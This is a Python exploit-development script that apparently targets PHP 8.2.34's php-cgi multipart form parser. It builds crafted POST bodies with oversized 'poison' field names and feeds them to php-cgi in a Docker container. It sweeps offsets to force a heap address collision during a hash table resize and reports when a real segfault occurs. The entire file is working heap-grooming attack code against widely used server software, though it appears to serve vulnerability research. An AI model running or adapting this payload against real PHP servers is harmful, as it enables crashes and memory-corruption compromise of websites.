#!/usr/bin/env python3
"""oom47: force arData-2 -> poison-block address collision, clean instrument.
Sweep k1 (poison fire point) around resize trigger 2048; detect:
  - poison lret2 addresses (40-page runs)
  - stage-1 resize lret2 (163840)
  - COLLISION = resize addr in poison addr set
  - key death (keycommit w/o keyok) + RC
Success = COLLISION && key-death && rc=139 (real segv at last).
usage: oom47.py [k1_start] [k1_end] [prep]
"""
import re
import subprocess
import sys
import time

NAMELEN = 3064
BIN34 = "/usr/src/php-8.2.34/sapi/cgi/php-cgi"


def dx(cmd, inp=None, timeout=590):
    args = ["docker", "exec"]
    if inp is not None:
        args.append("-i")
    args += ["phpbuild", "sh", "-c", cmd]
    r = subprocess.run(args, input=inp, capture_output=True, timeout=timeout)
    return r.returncode, r.stdout.decode("latin1")


def key_part(i):
    head = (b'--BOUND\r\nContent-Disposition: form-data; name="p' + b"K" * (NAMELEN - 8) +
            (b"%d" % i) + b'[x]"\r\n\r\n')
    return head + b"v\r\n"


def poison_part(n, poison=163840):
    cell = bytes([8, 8, 8, 8, 8, 8, 8, 8, 8, 1, 8, 8, 8, 8, 8, 8])
    nm = b"q" + cell * ((poison - 10) // 16) + (b"%06d" % n)
    return b'--BOUND\r\nContent-Disposition: form-data; name="' + nm + b'"\r\n\r\nv\r\n'


def build(k1, prep=3):
    ps = [key_part(i) for i in range(k1)]
    ps += [poison_part(n) for n in range(prep)]
    ps += [key_part(i) for i in range(k1, 4200)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)


def run_once(k1, prep=3, lim="20600000"):
    body = build(k1, prep)
    dx("cat > /tmp/att.bin", inp=body, timeout=120)
    cmd = ("REQUEST_METHOD=POST CONTENT_TYPE='multipart/form-data; boundary=BOUND' "
           "CONTENT_LENGTH=%d REDIRECT_STATUS=200 SCRIPT_FILENAME=/tmp/t_probe.php "
           "%s -d memory_limit=%s -d post_max_size=4096M -d max_input_vars=100000 "
           "</tmp/att.bin >/tmp/o.log 2>/tmp/e.log; echo RC=$?") % (len(body), BIN34, lim)
    _, out = dx(cmd)
    _, tr = dx("cat /tmp/e.log /tmp/o.log")
    # poison addrs: lret2 of ~1638xx asks occurring BEFORE the stage-1 2048->4096 resize
    resize_at = tr.find("TRACE resize from=2048 to=4096")
    poison_addrs = set(re.findall(r"TRACE lret2 size=1638(?:\d\d) ret=(0x[0-9a-f]+)",
                                  tr[:resize_at if resize_at > 0 else len(tr)]))
    m = re.search(r"TRACE resize from=2048 to=4096 bytes=163840[^\n]*\n(?:[^\n]*\n){0,2}?"
                  r"TRACE lret2 size=163840 ret=(0x[0-9a-f]+)", tr)
    arda2 = m.group(1) if m else "?"
    coll = arda2 in poison_addrs
    commits = re.findall(r"TRACE keycommit stage=1 elem=(\d+)", tr)
    last_c = commits[-1] if commits else "-"
    n_ok = tr.count("TRACE keyok stage=1")
    death = len(commits) > n_ok
    rc = out.strip().replace("RC=", "")
    print("k1=%d prep=%d rc=%s arda2=%s coll=%s lastelem=%s death=%s poison=%s"
          % (k1, prep, rc, arda2, coll, last_c, death,
             ",".join(sorted(poison_addrs))[:80]), flush=True)
    return coll, death, rc


if __name__ == "__main__":
    k1a = int(sys.argv[1]) if len(sys.argv) > 1 else 2044
    k1b = int(sys.argv[2]) if len(sys.argv) > 2 else 2047
    prep = int(sys.argv[3]) if len(sys.argv) > 3 else 3
    for k1 in range(k1a, k1b + 1):
        run_once(k1, prep)
